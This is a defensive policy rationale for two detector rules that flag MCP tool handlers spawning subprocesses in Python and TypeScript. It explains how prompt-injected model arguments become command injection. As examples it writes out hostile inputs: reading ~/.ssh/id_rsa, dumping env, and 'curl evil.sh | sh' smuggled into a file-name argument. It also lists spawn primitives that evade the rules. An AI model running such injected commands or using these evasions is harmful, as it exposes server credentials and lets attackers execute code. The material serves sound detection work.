---
policy_id: mcp_shell_safety
category: mcp
topic: shell_safety
rules:
  - id: MCP-010
    severity: high
    confidence: 0.7
    scope: tool
    fix_type: code
  - id: MCP-012
    severity: high
    confidence: 0.7
    scope: tool
    fix_type: code
references: [LLM06, LLM05]
---

# Policy Rationale: Shell Safety

**Policy ID:** `mcp_shell_safety`  
**File:** `mcp/shell_safety.yaml`  
**Rules:** MCP-010, MCP-012  
**Severities:** high, high  
**Fix types:** code, code  
**References:** LLM06, LLM05

---

## What this policy covers

MCP tool handlers — functions registered with `@server.tool`, `@mcp.tool`, or
`.register_tool` — whose body spawns an OS process. Two rules cover the two
authoring languages, both keyed on the same structured `has_shell_call`
predicate (an AST callee walk, not a substring scan, so the call name appearing
in a comment, docstring, or string literal does not fire). **MCP-010** (Python)
fires when the handler calls `os.system`, `os.popen`, any `subprocess.*` member
(`subprocess.run`, `.Popen`, `.call`, `.check_output`, `.check_call`, …), or any
`os.spawn*` member. **MCP-012** (TypeScript) fires when the handler invokes a
`child_process` API — `exec`, `execSync`, `spawn` (and the related
`execFile`/`execFileSync`/`spawnSync`/`fork`) — called bare from a destructured
`const { exec } = ...` or via a `child_process.*` namespace. Both rules fire on
**any** subprocess spawn from the tool body; neither is gated on `shell=True` /
`shell: true` — the presence of process spawn on a model-callable surface is the
signal, and the shell flag only widens an already-broad primitive.

---

## Why shell invocation is a distinct concern in agent tools

A tool body that spawns a subprocess is a command-execution surface driven by
**fully model-controlled inputs across the MCP boundary**. In a conventional
program a subprocess callsite is fixed: the developer wrote the command, and the
only variability is parameter substitution they explicitly approved. An MCP tool
inverts this. The arguments arrive as a JSON payload from a connecting client's
model, and the MCP protocol places **no human in the loop** between the model
deciding to call the tool and the server running it. The tool author may intend
"the model only supplies one argument," but the protocol enforces nothing: a
prompt-injected conversation returns whatever strings it wants, and the handler
faithfully spawns whatever it builds. If any argument reaches the command —
especially via `shell=True` / `shell: true` or string concatenation into a
command line — that is textbook command injection. Even with no injection at
all, an unsandboxed subprocess hands the calling model arbitrary local
capability: the spawned process inherits the server host's filesystem,
environment (including API keys and database credentials), and outbound network
access.

The MCP boundary sharpens this in two ways a single-process agent does not face.
First, an MCP server is **long-lived infrastructure that may be shared across
clients and sessions** — it is not a script the author runs once under their own
eyes. A spawn primitive exposed here is reachable by every model on every
connection for the life of the process, and the blast radius is the server
host's identity, not the caller's. Second, the MCP runtime provides **no
sandbox** around tool execution; the subprocess gets exactly what the server
process has. A model-driven `subprocess.run("env", shell=True)` exfiltrates the
server's secrets in one call; a `subprocess.run("cat ~/.ssh/id_rsa", shell=True)`
leaks a private key straight into the model context, and from there into provider
logs, the next turn, or a third party.

Manual deny-list filtering (regex against `rm -rf`, `curl`, `wget`) is not a
defense at this boundary. The space of dangerous commands is unbounded, encodings
(base64, hex, unicode) walk around naïve patterns, and every new binary on the
server's PATH introduces a new attack class. This is why OWASP LLM Top 10:2025
puts **Excessive Agency (LLM06)** at the center of agent security and pairs it
here with **Improper Output Handling (LLM05)**: the moment a model-callable tool
can spawn a process, it can effectively do anything the server's account can do,
and a model-supplied string flowing unfiltered into a shell is the worst case of
trusting model output as a command. The right answer is almost always to remove
process spawn from the tool surface, not to filter it.

---

## Rule-by-rule defense

### MCP-010 — Tool body spawns a subprocess (Severity: high, Confidence: 0.7, Fix type: code)

**What we detect:**
A Python MCP tool handler (`@server.tool` / `@mcp.tool` / `.register_tool`)
whose body calls `os.system`, `os.popen`, any `subprocess.*` function (e.g.
`subprocess.run`, `subprocess.Popen`, `subprocess.call`, `subprocess.check_output`,
`subprocess.check_call`), or any `os.spawn*` function. The match is the structured
`has_shell_call` predicate — an AST call-node walk that resolves the callee, not a
substring scan — so a `subprocess.run(` appearing in a comment, docstring, or
string literal does not trigger it. The rule fires on **any** such spawn; it does
not require `shell=True`.

**Why it is flaggable:**
Process spawn from inside a model-callable MCP tool puts the OS shell on the
model's tool surface, reachable by any connecting client with no approval prompt
in the protocol. Because the model chooses the JSON arguments, a prompt-injected
conversation can steer those values into the command. Every safeguard (sandbox,
deny-list, working-directory pin) is bolted on top of an inherently broad
primitive; the rule fires unconditionally because the *presence* of process spawn
is the signal, independent of whether the author wrapped it in filtering.

**Real-world consequence:**
- A `run_command(command: str)` tool forwarding the model-supplied string into
  `subprocess.run(command, shell=True)` is one injected instruction away from
  `cat ~/.ssh/id_rsa` or `env` — secrets stream back into the model context and
  out to whoever controls the conversation.
- A `convert_file(path: str)` tool that shells out to a CLI converter with the
  path concatenated into the command is driven into `report.pdf; curl evil.sh | sh`
  via argument injection — no `shell=True` needed if a shell is invoked
  downstream, and arbitrary code runs on the server host.

**Why severity is high and not medium:**
The fix usually requires removing process spawn from the tool altogether or
rearchitecting it behind a typed API. Partial mitigations (argv lists,
`shell=False`, working-directory pinning) reduce specific injection classes but do
not eliminate the underlying excessive-agency problem — a model that can spawn a
process can do whatever the server account can. Severity is not bumped above
`high` because the highest tier is reserved for unconditional remote-code-execution
exposures; here the realized exposure still depends on what the handler does with
the spawn and what the host grants it.

**Fix type — code:**
Replacing `subprocess.run(...)` with a typed library call, or fronting it with an
argv list and a command allow-list, is an edit to the tool's own source. A sandbox
at the server/deployment level (seccomp, container, dropped credentials) is
complementary but is not what the rule asks for.

**Confidence 0.7:**
Lower than the OpenAI sibling's 0.9 because MCP tool authors more often wrap a
single fixed command legitimately, and the rule deliberately detects that the tool
*shells out* — not that it does so unsafely. False positives: a handler that
builds a hardcoded argv with no model-derived input
(`subprocess.run(["systemctl", "status", "nginx"])`) still fires even though
nothing flows from the caller; and the `subprocess.*` prefix over-matches the
non-spawning helper `subprocess.list2cmdline(...)`. Whether a genuine spawn is
*safe* in context is a human judgment the rule does not make. False negatives: a
spawn via `multiprocessing.Process`, `asyncio.create_subprocess_exec` /
`create_subprocess_shell`, `pty.spawn` / `pexpect`, or the `os.exec*` family is
not in the callee set, and a spawn wrapped behind a helper (`_run(...)`) defined in
another module escapes the body-only walk. The 0.7 reflects this "shells out at
all" framing.

### MCP-012 — TypeScript MCP tool spawns a subprocess (Severity: high, Confidence: 0.7, Fix type: code)

**What we detect:**
A TypeScript MCP tool handler whose body invokes a `child_process` API — `exec`,
`execSync`, `execFile`, `execFileSync`, `spawn`, `spawnSync`, or `fork` — whether
called bare (from a destructured `const { exec } = require("child_process")` /
`import { exec }`) or via a `child_process.*` namespace. Detection is the same
structured `has_shell_call` predicate: during discovery the handler AST is walked
and a `shells_out` fact is stamped when one of those callees appears, which the
predicate reads. This is a resolved-callee match, **not** a substring scan, so the
name appearing in a comment, an unrelated identifier, or a string literal does not
fire. The rule fires on **any** such spawn; it does not require `shell: true`.

**Why it is flaggable:**
A `child_process` API in a model-callable MCP tool puts OS process spawn on the
model's surface, reachable across the MCP boundary by any connecting client with
no human approval in the protocol. Because the model chooses the arguments it
passes to the tool, a prompt-injected conversation can steer those values into an
OS command — turning the server into an arbitrary-command primitive on its host.
The mechanism is the same excessive-agency core as the Python sibling
[MCP-010](#mcp-010--tool-body-spawns-a-subprocess-severity-high-confidence-07-fix-type-code);
the only delta is the API surface (`child_process` `exec`/`execSync`/`spawn` vs
Python `subprocess.*` / `os.system`).

**Real-world consequence:**
- A `runCommand(cmd: string)` tool forwarding `cmd` into `execSync(cmd)` (which
  runs through `/bin/sh`) is one injected instruction away from `cat ~/.ssh/id_rsa`
  or exfiltrating `process.env` — the server's secrets stream back into the model
  context.
- A `convertFile(path: string)` tool calling `exec("convert " + path + " out.png")`
  is driven into `in.png; curl evil.sh | sh` via the model-supplied path —
  concatenation into a shell string means arbitrary code runs on the server host
  with the server's credentials.

**Why severity is high and not medium:**
The fix usually means removing process spawn or rearchitecting behind a typed API;
partial mitigations (argv arrays, dropping `shell: true`) narrow specific injection
classes but not the excessive-agency core. Matches the Python sibling's `high` and
is not bumped above it for the same reason — the realized exposure depends on what
the handler does with the spawn and what the host grants.

**Fix type — code:**
Replacing the `child_process` call with a library API, or fronting it with an argv
array (`execFile`/`spawn` with an explicit args list, never a shell string) and an
allow-list, is an edit to the tool's own source. A deployment-level sandbox is
complementary.

**Confidence 0.7:**
Matches the Python sibling's 0.7 and shares its mechanism (a structured callee
match). False positives: a handler that spawns a single fixed command with a
hardcoded argv and no model input (`execFile("git", ["status"])`) still fires —
the rule detects that the tool *shells out*, not that it does so unsafely. False
negatives: a spawn reached through a renamed destructured alias
(`const { exec: run } = ...; run(...)`) whose callee text matches none of the
recognized names, one hidden in a helper in another module, or a spawn via a path
outside the recognized set — `Bun.spawn`, `Deno.Command`, `node:worker_threads`,
or a native addon — is not seen. The 0.7 reflects this "shells out at all" framing
rather than any substring imprecision.

---

## What this policy does not cover

Write this as an adversary would. The following structurally similar patterns
escape detection:

- **Python alternative spawn primitives** — `asyncio.create_subprocess_exec` /
  `asyncio.create_subprocess_shell`, `pty.spawn`, `pexpect.spawn`,
  `multiprocessing.Process`, and the `os.exec*` family (which replaces the current
  process). None are in the MCP-010 callee set.
- **TypeScript alternative spawn primitives** — `Bun.spawn`, `Deno.Command`,
  `node:worker_threads`, or a native addon that shells out. None are in the
  MCP-012 callee set.
- **Renamed or indirected callees** — a destructured alias
  (`const { exec: run } = ...; run(...)`) or a spawn wrapped behind a helper
  (`_run_safely(...)` in Python, a utility function in another file). Both rules
  scan the tool body only, so a spawn one call-frame away in another module is
  invisible.
- **Whether a given literal command is safe.** A handler that runs a fully
  hardcoded argv with no model input fires the rule even though it is comparatively
  benign — the signal is "this tool shells out at all," not "this tool shells out
  unsafely." This is the dominant false-positive class and the reason confidence is
  0.7, not higher.
- **The shell flag itself is not what gates the rule.** A tool that passes an argv
  list with `shell=False` / no `shell: true` still fires; conversely, satisfying
  the rule by dropping the shell flag narrows injection but does not remove the
  process-spawn capability the model can still reach.
- **Non-subprocess exfiltration.** Filesystem writes outside a workspace,
  env-var leakage, and HTTP/socket exfiltration that does not go through a
  subprocess belong to other policies — the MCP HTTP/SSRF surface is covered by
  [network.md](network.md).

---

## Recommendations beyond the fix

```python
# Replace a model-driven `subprocess.run(command, shell=True)` tool with a typed
# API. If a subprocess is genuinely required, build the argv explicitly, pin the
# binary, validate inputs against an allow-list, set a timeout, and drop ambient
# secrets from the child environment.
import shutil
from pathlib import Path

from mcp.server.fastmcp import FastMCP

server = FastMCP("files")

WORKSPACE = Path("/srv/agent/workspace").resolve()
ALLOWED_FORMATS = {"png", "jpg", "webp"}


@server.tool()
def convert_image(filename: str, to_format: str) -> dict:
    """Convert an image already inside the workspace to another format.
    `filename` must resolve inside the workspace; `to_format` must be allowed."""
    if to_format not in ALLOWED_FORMATS:
        return {"error": "unsupported format", "retryable": False}

    src = (WORKSPACE / filename).resolve()
    if not src.is_relative_to(WORKSPACE) or not src.is_file():
        return {"error": "path escapes workspace", "retryable": False}

    dst = src.with_suffix(f".{to_format}")
    convert = shutil.which("convert")  # pinned absolute path, not a PATH lookup
    if convert is None:
        return {"error": "converter unavailable", "retryable": False}

    import subprocess
    subprocess.run(
        [convert, str(src), str(dst)],  # argv list — no shell, no concatenation
        shell=False,
        timeout=30,                      # a model can request an endless command
        env={"PATH": "/usr/bin"},        # drop inherited secrets and credentials
        check=True,
    )
    return {"output": str(dst)}
```

1. **Prefer a typed library API over shelling out at all.** Most "run a CLI" tools
   have a native equivalent (an image library, a Git library, an HTTP client); the
   safest subprocess is the one you removed.
2. **If a subprocess is unavoidable, build the argv list explicitly and pass
   `shell=False` / never `shell: true`.** Never interpolate or concatenate
   model-supplied strings into a command line. In TypeScript prefer
   `execFile`/`spawn` with an args array over `exec`/`execSync`.
3. **Pin the binary to an absolute path** (via `shutil.which` at startup, not a
   runtime PATH lookup) so a planted binary earlier on PATH cannot hijack the call.
4. **Validate every model-supplied argument against a strict allow-list** before it
   reaches the spawn — enumerated choices, not deny-list regex.
5. **Always set a timeout.** An MCP server is long-lived; a model can otherwise pin
   a CPU or hold a file handle indefinitely across sessions.
6. **Drop sensitive env vars from the child.** Pass an explicit minimal `env=` /
   options `env`; the default inherits the whole server environment, including API
   keys and database credentials.
7. **Run the MCP server under an OS sandbox with no ambient credentials** — a
   container with a read-only root filesystem, dropped capabilities, a non-root
   user, and a network-egress allow-list. Because the server is shared
   infrastructure, treat any in-handler filtering as belt-and-braces, not the
   primary boundary.
8. **Log every spawned command with the connection / session identity and the
   arguments the model supplied**, so an incident on a shared server can be
   attributed and reconstructed.
